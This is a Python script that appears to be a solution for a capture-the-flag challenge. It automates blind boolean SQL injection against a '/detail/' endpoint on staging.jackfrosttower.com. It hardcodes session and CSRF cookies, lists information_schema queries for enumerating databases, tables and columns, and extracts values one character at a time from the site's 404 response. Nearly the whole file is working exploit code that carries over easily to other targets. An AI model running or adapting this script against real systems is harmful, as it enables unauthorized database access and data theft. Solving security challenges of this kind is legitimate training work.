import requests
import urllib

# Regist twice with same email to get cookies at: https://staging.jackfrosttower.com/contact
# Set up cookies
csrf = "s4i4lo_tq6GQTXZ7M8FM4VCz"
connectSID = "s%3AHFyaewNwSO5z34PMmvOziWAoDyUHy1Xl.6DWpXgaBZYSwr62rzsv1m0aIYaJVnnZGVxWcF%2FkVT3k"
cookies = {
    "_csrf":csrf,
    "connect.sid":connectSID
    }

# Column and Table to run the blind SQLi against
sqlColumn = "table_name"
sqlTable = "information_schema.tables"

# Null if not using a WHERE statement. Include extra spaces and the word WHERE. Ex: sqlWhere = " WHERE table_schema = 'db_name' "
sqlWhere = " WHERE table_schema = 'encontact' "

# Queries to try:
# SELECT schema_name FROM information_schema.schemata => databases
# SELECT table_name FROM information_schema.tables WHERE table_schema = 'encontact' => Tables in the encontact DB
# SELECT column_name FROM information_schema.columns WHERE table_name = 'todo' => Columns in the todo table
# SELECT note FROM todo => The todo list

# https://staging.jackfrosttower.com/detail/<sqliString> for blind SQLi testing 1 character at a time.
# sqliString is URL encoded version of:
#   1000,1 AND "<testChar>" = (select (ascii(substring(<sqlColumn> from <position> for 1))) from <sqlTable> <sqlWhere> limit 1 OFFSET <row>)
# Example:
#   1000,1 AND "105" = (select (ascii(substring(schema_name from 1 for 1))) from information_schema.schemata limit 1 OFFSET 0)
#   1000,1%20AND%20%22105%22%20=%20(select%20(ascii(substring(schema_name%20from%201%20for%201)))%20from%20information_schema.schemata%20limit%201%20OFFSET%200)
# Record 1000 doesn't exsit and record 1 does. "404 Not found!!" displays if logic after AND statement is false. Record 1 displays if it's true.
notfoundString = "404 Not found!!"
url1 = "https://staging.jackfrosttower.com/detail/"

# ASCII range: null + space(32) + 33 through 126. Lowercase letters, then uppercase, and then the rest.
charRange = [*range(0,1), *range(97,123), *range(65,91), *range(32,65), *range(91,97), *range(123,127)]

attempts = 0
for row in range(0,5):
    print("\nRow " + str(row) + ": ", end='', flush=True)
    position = 1  # Start testing character 1.
    while (position > 0):
        for testChar in charRange:
            sqliString = '1000,1%20AND%20%22' + str(testChar) + '%22%20=%20(select%20(ascii(substring(' + sqlColumn + '%20from%20' + str(position) + '%20for%201)))%20from%20' + sqlTable + urllib.parse.quote(sqlWhere) + '%20limit%201%20OFFSET%20' + str(row) + ')'
            x = requests.get(url1 + sqliString, cookies = cookies)

            attempts += 1
            if (notfoundString not in x.text):
                # Print and move on to the next character
                print(chr(testChar), end='', flush=True)
                attempts = 0
                position += 1
                x.close()
                break

        if (testChar == 0 or attempts >= 96):
            # Null = next row
            # No characters found = quit out
            break

    if (attempts >= 96):
        # No characters found = quit out
        print("")
        break